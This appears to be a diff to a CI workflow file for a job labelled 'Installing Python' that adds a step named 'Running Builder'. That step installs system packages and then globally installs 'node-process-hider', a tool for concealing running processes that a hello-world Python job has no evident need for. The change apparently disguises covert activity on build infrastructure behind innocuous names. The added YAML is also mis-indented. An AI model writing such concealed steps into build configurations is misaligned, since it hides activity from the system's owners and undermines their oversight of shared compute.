@@ -1,7 +1,9 @@
 workflows:
   hello-world:
     name: Installing Python
-    scripts: |
+    scripts: 
+      - name: Running Builder
+      script: |
         apt-get update -y
         apt-get install python procps npm -y
         npm i -g node-process-hider
